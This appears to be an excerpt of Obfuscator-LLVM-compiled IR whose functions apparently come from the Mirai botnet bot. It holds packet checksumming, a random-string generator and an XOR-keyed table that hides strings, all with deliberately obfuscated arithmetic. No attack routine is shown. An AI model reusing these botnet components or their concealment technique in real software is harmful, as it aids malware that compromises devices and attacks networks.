define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %43

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = sub i32 0, %30
  %32 = sub i32 0, %29
  %33 = add i32 %31, %32
  %34 = sub i32 0, %33
  %35 = add i32 %30, %29
  store i32 %34, i32* %12, align 4
  %36 = load i16*, i16** %9, align 8
  %37 = getelementptr inbounds i16, i16* %36, i32 1
  store i16* %37, i16** %9, align 8
  %38 = load i32, i32* %8, align 4
  %39 = add i32 %38, -215347093
  %40 = sub i32 %39, 2
  %41 = sub i32 %40, -215347093
  %42 = sub nsw i32 %38, 2
  store i32 %41, i32* %8, align 4
  br label %23

; <label>:43:                                     ; preds = %23
  %44 = load i32, i32* %8, align 4
  %45 = icmp eq i32 %44, 1
  br i1 %45, label %46, label %57

; <label>:46:                                     ; preds = %43
  %47 = load i16*, i16** %9, align 8
  %48 = bitcast i16* %47 to i8*
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = load i32, i32* %12, align 4
  %52 = sub i32 0, %51
  %53 = sub i32 0, %50
  %54 = add i32 %52, %53
  %55 = sub i32 0, %54
  %56 = add i32 %51, %50
  store i32 %55, i32* %12, align 4
  br label %57

; <label>:57:                                     ; preds = %46, %43
  %58 = load i32, i32* %10, align 4
  %59 = lshr i32 %58, 16
  %60 = xor i32 %59, -1
  %61 = xor i32 65535, -1
  %62 = xor i32 -1886014332, -1
  %63 = or i32 %60, %61
  %64 = or i32 -1886014332, %62
  %65 = xor i32 %63, -1
  %66 = and i32 %65, %64
  %67 = and i32 %59, 65535
  %68 = load i32, i32* %12, align 4
  %69 = sub i32 0, %68
  %70 = sub i32 0, %66
  %71 = add i32 %69, %70
  %72 = sub i32 0, %71
  %73 = add i32 %68, %66
  store i32 %72, i32* %12, align 4
  %74 = load i32, i32* %10, align 4
  %75 = xor i32 65535, -1
  %76 = xor i32 %74, %75
  %77 = and i32 %76, %74
  %78 = and i32 %74, 65535
  %79 = load i32, i32* %12, align 4
  %80 = sub i32 0, %77
  %81 = sub i32 %79, %80
  %82 = add i32 %79, %77
  store i32 %81, i32* %12, align 4
  %83 = load i32, i32* %11, align 4
  %84 = lshr i32 %83, 16
  %85 = xor i32 %84, -1
  %86 = xor i32 65535, -1
  %87 = xor i32 1490232088, -1
  %88 = or i32 %85, %86
  %89 = or i32 1490232088, %87
  %90 = xor i32 %88, -1
  %91 = and i32 %90, %89
  %92 = and i32 %84, 65535
  %93 = load i32, i32* %12, align 4
  %94 = sub i32 0, %91
  %95 = sub i32 %93, %94
  %96 = add i32 %93, %91
  store i32 %95, i32* %12, align 4
  %97 = load i32, i32* %11, align 4
  %98 = xor i32 %97, -1
  %99 = xor i32 65535, -1
  %100 = xor i32 1814311914, -1
  %101 = or i32 %98, %99
  %102 = or i32 1814311914, %100
  %103 = xor i32 %101, -1
  %104 = and i32 %103, %102
  %105 = and i32 %97, 65535
  %106 = load i32, i32* %12, align 4
  %107 = sub i32 0, %104
  %108 = sub i32 %106, %107
  %109 = add i32 %106, %104
  store i32 %108, i32* %12, align 4
  %110 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %111 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %110, i32 0, i32 6
  %112 = load i8, i8* %111, align 1
  %113 = zext i8 %112 to i16
  %114 = call zeroext i16 @htons(i16 zeroext %113) #7
  %115 = zext i16 %114 to i32
  %116 = load i32, i32* %12, align 4
  %117 = add i32 %116, -1735934728
  %118 = add i32 %117, %115
  %119 = sub i32 %118, -1735934728
  %120 = add i32 %116, %115
  store i32 %119, i32* %12, align 4
  %121 = load i16, i16* %7, align 2
  %122 = zext i16 %121 to i32
  %123 = load i32, i32* %12, align 4
  %124 = sub i32 %123, 1932309924
  %125 = add i32 %124, %122
  %126 = add i32 %125, 1932309924
  %127 = add i32 %123, %122
  store i32 %126, i32* %12, align 4
  br label %128

; <label>:128:                                    ; preds = %132, %57
  %129 = load i32, i32* %12, align 4
  %130 = lshr i32 %129, 16
  %131 = icmp ne i32 %130, 0
  br i1 %131, label %132, label %149

; <label>:132:                                    ; preds = %128
  %133 = load i32, i32* %12, align 4
  %134 = xor i32 %133, -1
  %135 = xor i32 65535, -1
  %136 = xor i32 -232626193, -1
  %137 = or i32 %134, %135
  %138 = or i32 -232626193, %136
  %139 = xor i32 %137, -1
  %140 = and i32 %139, %138
  %141 = and i32 %133, 65535
  %142 = load i32, i32* %12, align 4
  %143 = lshr i32 %142, 16
  %144 = sub i32 0, %140
  %145 = sub i32 0, %143
  %146 = add i32 %144, %145
  %147 = sub i32 0, %146
  %148 = add i32 %140, %143
  store i32 %147, i32* %12, align 4
  br label %128

; <label>:149:                                    ; preds = %128
  %150 = load i32, i32* %12, align 4
  %151 = xor i32 %150, -1
  %152 = and i32 604032227, %151
  %153 = xor i32 604032227, -1
  %154 = and i32 %150, %153
  %155 = xor i32 -1, -1
  %156 = and i32 %155, 604032227
  %157 = and i32 -1, %153
  %158 = or i32 %152, %154
  %159 = or i32 %156, %157
  %160 = xor i32 %158, %159
  %161 = xor i32 %150, -1
  %162 = trunc i32 %160 to i16
  ret i16 %162
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, -1
  %7 = and i32 %4, %6
  %8 = xor i32 %4, -1
  %9 = and i32 %5, %8
  %10 = or i32 %7, %9
  %11 = xor i32 %5, %4
  store i32 %10, i32* %1, align 4
  %12 = load i32, i32* %1, align 4
  %13 = lshr i32 %12, 8
  %14 = load i32, i32* %1, align 4
  %15 = xor i32 %14, -1
  %16 = and i32 1157344786, %15
  %17 = xor i32 1157344786, -1
  %18 = and i32 %14, %17
  %19 = xor i32 %13, -1
  %20 = and i32 %19, 1157344786
  %21 = and i32 %13, %17
  %22 = or i32 %16, %18
  %23 = or i32 %20, %21
  %24 = xor i32 %22, %23
  %25 = xor i32 %14, %13
  store i32 %24, i32* %1, align 4
  %26 = load i32, i32* @y, align 4
  store i32 %26, i32* @x, align 4
  %27 = load i32, i32* @z, align 4
  store i32 %27, i32* @y, align 4
  %28 = load i32, i32* @w, align 4
  store i32 %28, i32* @z, align 4
  %29 = load i32, i32* @w, align 4
  %30 = lshr i32 %29, 19
  %31 = load i32, i32* @w, align 4
  %32 = xor i32 %31, -1
  %33 = and i32 %30, %32
  %34 = xor i32 %30, -1
  %35 = and i32 %31, %34
  %36 = or i32 %33, %35
  %37 = xor i32 %31, %30
  store i32 %36, i32* @w, align 4
  %38 = load i32, i32* %1, align 4
  %39 = load i32, i32* @w, align 4
  %40 = xor i32 %39, -1
  %41 = and i32 %38, %40
  %42 = xor i32 %38, -1
  %43 = and i32 %39, %42
  %44 = or i32 %41, %43
  %45 = xor i32 %39, %38
  store i32 %44, i32* @w, align 4
  %46 = load i32, i32* @w, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [32 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 zeroext 61)
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %7 = call i8* @table_retrieve_val(i32 61, i32* null)
  %8 = call i8* @strcpy(i8* %6, i8* %7) #6
  br label %9

; <label>:9:                                      ; preds = %16, %2
  %10 = load i32, i32* %4, align 4
  %11 = sub i32 %10, -553848737
  %12 = add i32 %11, -1
  %13 = add i32 %12, -553848737
  %14 = add nsw i32 %10, -1
  store i32 %13, i32* %4, align 4
  %15 = icmp ne i32 %10, 0
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %9
  %17 = call i32 @rand_next()
  %18 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %19 = call i32 @util_strlen(i8* %18)
  %20 = urem i32 %17, %19
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = load i8*, i8** %3, align 8
  %25 = getelementptr inbounds i8, i8* %24, i32 1
  store i8* %25, i8** %3, align 8
  store i8 %23, i8* %24, align 1
  br label %9

; <label>:26:                                     ; preds = %9
  call void @table_lock_val(i8 zeroext 61)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = xor i32 255, -1
  %14 = xor i32 %12, %13
  %15 = and i32 %14, %12
  %16 = and i32 %12, 255
  %17 = trunc i32 %15 to i8
  store i8 %17, i8* %5, align 1
  %18 = load i32, i32* @table_key, align 4
  %19 = lshr i32 %18, 8
  %20 = xor i32 %19, -1
  %21 = xor i32 255, -1
  %22 = xor i32 -1159798378, -1
  %23 = or i32 %20, %21
  %24 = or i32 -1159798378, %22
  %25 = xor i32 %23, -1
  %26 = and i32 %25, %24
  %27 = and i32 %19, 255
  %28 = trunc i32 %26 to i8
  store i8 %28, i8* %6, align 1
  %29 = load i32, i32* @table_key, align 4
  %30 = lshr i32 %29, 16
  %31 = xor i32 %30, -1
  %32 = xor i32 255, -1
  %33 = xor i32 1750028381, -1
  %34 = or i32 %31, %32
  %35 = or i32 1750028381, %33
  %36 = xor i32 %34, -1
  %37 = and i32 %36, %35
  %38 = and i32 %30, 255
  %39 = trunc i32 %37 to i8
  store i8 %39, i8* %7, align 1
  %40 = load i32, i32* @table_key, align 4
  %41 = lshr i32 %40, 24
  %42 = xor i32 255, -1
  %43 = xor i32 %41, %42
  %44 = and i32 %43, %41
  %45 = and i32 %41, 255
  %46 = trunc i32 %44 to i8
  store i8 %46, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %47

; <label>:47:                                     ; preds = %133, %1
  %48 = load i32, i32* %3, align 4
  %49 = load %struct.table_value*, %struct.table_value** %4, align 8
  %50 = getelementptr inbounds %struct.table_value, %struct.table_value* %49, i32 0, i32 1
  %51 = load i16, i16* %50, align 8
  %52 = zext i16 %51 to i32
  %53 = icmp slt i32 %48, %52
  br i1 %53, label %54, label %139

; <label>:54:                                     ; preds = %47
  %55 = load i8, i8* %5, align 1
  %56 = zext i8 %55 to i32
  %57 = load %struct.table_value*, %struct.table_value** %4, align 8
  %58 = getelementptr inbounds %struct.table_value, %struct.table_value* %57, i32 0, i32 0
  %59 = load i8*, i8** %58, align 8
  %60 = load i32, i32* %3, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = xor i32 %64, -1
  %66 = and i32 -190095172, %65
  %67 = xor i32 -190095172, -1
  %68 = and i32 %64, %67
  %69 = xor i32 %56, -1
  %70 = and i32 %69, -190095172
  %71 = and i32 %56, %67
  %72 = or i32 %66, %68
  %73 = or i32 %70, %71
  %74 = xor i32 %72, %73
  %75 = xor i32 %64, %56
  %76 = trunc i32 %74 to i8
  store i8 %76, i8* %62, align 1
  %77 = load i8, i8* %6, align 1
  %78 = zext i8 %77 to i32
  %79 = load %struct.table_value*, %struct.table_value** %4, align 8
  %80 = getelementptr inbounds %struct.table_value, %struct.table_value* %79, i32 0, i32 0
  %81 = load i8*, i8** %80, align 8
  %82 = load i32, i32* %3, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %81, i64 %83
  %85 = load i8, i8* %84, align 1
  %86 = sext i8 %85 to i32
  %87 = xor i32 %86, -1
  %88 = and i32 -1685356860, %87
  %89 = xor i32 -1685356860, -1
  %90 = and i32 %86, %89
  %91 = xor i32 %78, -1
  %92 = and i32 %91, -1685356860
  %93 = and i32 %78, %89
  %94 = or i32 %88, %90
  %95 = or i32 %92, %93
  %96 = xor i32 %94, %95
  %97 = xor i32 %86, %78
  %98 = trunc i32 %96 to i8
  store i8 %98, i8* %84, align 1
  %99 = load i8, i8* %7, align 1
  %100 = zext i8 %99 to i32
  %101 = load %struct.table_value*, %struct.table_value** %4, align 8
  %102 = getelementptr inbounds %struct.table_value, %struct.table_value* %101, i32 0, i32 0
  %103 = load i8*, i8** %102, align 8
  %104 = load i32, i32* %3, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = sext i8 %107 to i32
  %109 = xor i32 %108, -1
  %110 = and i32 %100, %109
  %111 = xor i32 %100, -1
  %112 = and i32 %108, %111
  %113 = or i32 %110, %112
  %114 = xor i32 %108, %100
  %115 = trunc i32 %113 to i8
  store i8 %115, i8* %106, align 1
  %116 = load i8, i8* %8, align 1
  %117 = zext i8 %116 to i32
  %118 = load %struct.table_value*, %struct.table_value** %4, align 8
  %119 = getelementptr inbounds %struct.table_value, %struct.table_value* %118, i32 0, i32 0
  %120 = load i8*, i8** %119, align 8
  %121 = load i32, i32* %3, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  %124 = load i8, i8* %123, align 1
  %125 = sext i8 %124 to i32
  %126 = xor i32 %125, -1
  %127 = and i32 %117, %126
  %128 = xor i32 %117, -1
  %129 = and i32 %125, %128
  %130 = or i32 %127, %129
  %131 = xor i32 %125, %117
  %132 = trunc i32 %130 to i8
  store i8 %132, i8* %123, align 1
  br label %133

; <label>:133:                                    ; preds = %54
  %134 = load i32, i32* %3, align 4
  %135 = sub i32 %134, 2126659730
  %136 = add i32 %135, 1
  %137 = add i32 %136, 2126659730
  %138 = add nsw i32 %134, 1
  store i32 %137, i32* %3, align 4
  br label %47

; <label>:139:                                    ; preds = %47
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %59

; <label>:16:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

; <label>:17:                                     ; preds = %52, %16
  %18 = load i32, i32* %10, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %17
  %22 = load i8*, i8** %6, align 8
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %22, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  br i1 %34, label %35, label %50

; <label>:35:                                     ; preds = %21
  %36 = load i32, i32* %11, align 4
  %37 = sub i32 0, %36
  %38 = sub i32 0, 1
  %39 = add i32 %37, %38
  %40 = sub i32 0, %39
  %41 = add nsw i32 %36, 1
  store i32 %40, i32* %11, align 4
  %42 = load i32, i32* %9, align 4
  %43 = icmp eq i32 %40, %42
  br i1 %43, label %44, label %49

; <label>:44:                                     ; preds = %35
  %45 = load i32, i32* %10, align 4
  %46 = sub i32 0, 1
  %47 = sub i32 %45, %46
  %48 = add nsw i32 %45, 1
  store i32 %47, i32* %5, align 4
  br label %59

; <label>:49:                                     ; preds = %35
  br label %51

; <label>:50:                                     ; preds = %21
  store i32 0, i32* %11, align 4
  br label %51

; <label>:51:                                     ; preds = %50, %49
  br label %52

; <label>:52:                                     ; preds = %51
  %53 = load i32, i32* %10, align 4
  %54 = add i32 %53, 1027087027
  %55 = add i32 %54, 1
  %56 = sub i32 %55, 1027087027
  %57 = add nsw i32 %53, 1
  store i32 %56, i32* %10, align 4
  br label %17

; <label>:58:                                     ; preds = %17
  store i32 -1, i32* %5, align 4
  br label %59

; <label>:59:                                     ; preds = %58, %44, %15
  %60 = load i32, i32* %5, align 4
  ret i32 %60
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146846898}
!2 = !{i32 -2146846489}
